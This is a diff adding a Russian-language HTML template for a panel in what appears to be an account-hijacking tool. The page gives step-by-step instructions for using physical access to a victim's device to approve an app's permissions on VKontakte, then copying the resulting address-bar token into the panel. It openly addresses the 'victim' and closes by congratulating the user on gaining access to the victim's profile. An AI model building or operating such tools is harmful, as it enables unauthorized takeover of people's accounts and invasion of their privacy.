@@ -1,0 +1,32 @@
+{% extends "panel/base.html" %}
+{% block content %}
+    <style>
+        .info-list > li, .info-list > li {
+            font-size: 12pt;
+        }
+    </style>
+    <div class="content" style="height: 100vh;">
+        <div class="col-md-12" style="height: 100%; overflow-y: auto;">
+            <span style="font-size: 12pt;"><i>Ваша персональная ссылка: </i></span>
+            <input id="grab" onclick="$('#grab').select();" type="text" class="form-control" value="{{ url }}" style="width: 250px;" readonly>
+            <h2 class="text-out">Инструкция</h2>
+            <ol class="info-list">
+                <li>Откройте браузер на устройстве жертвы и перейдите по своей <a href="#" onclick="$('#grab').select();">персональной ссылке</a></li>
+                <li>Нажмите на кнопку <b>Перейти</b> и в появившейся вкладке подтвердите права доступа приложения</li>
+                <li>Скопируйте содержимое адресной строки</li>
+                <li>Перейдите обратно по своей <a href="#" onclick="$('#grab').select();">персональной ссылке</a> и вставьте содержимое адресной строки в соответствующее поле внизу страницы</li>
+                <li>Нажмите на кнопку <b>Получить доступ</b></li>
+                <li>Поздравляем! Вы получили доступ к профилю жертвы!</li>
+            </ol>
+            <h2 class="text-out">Необходимые условия</h2>
+            <ul class="info-list">
+                <li>Вам необходимо иметь физический доступ к устройству жертвы, чтобы самим подтвердить права приложения</li>
+                <li>Жертва должна быть авторизована ВКонтакте через браузер</li>
+            </ul>
+        </div>
+    </div>
+    <script>
+        function load() {
+        }
+    </script>
+{% endblock %}
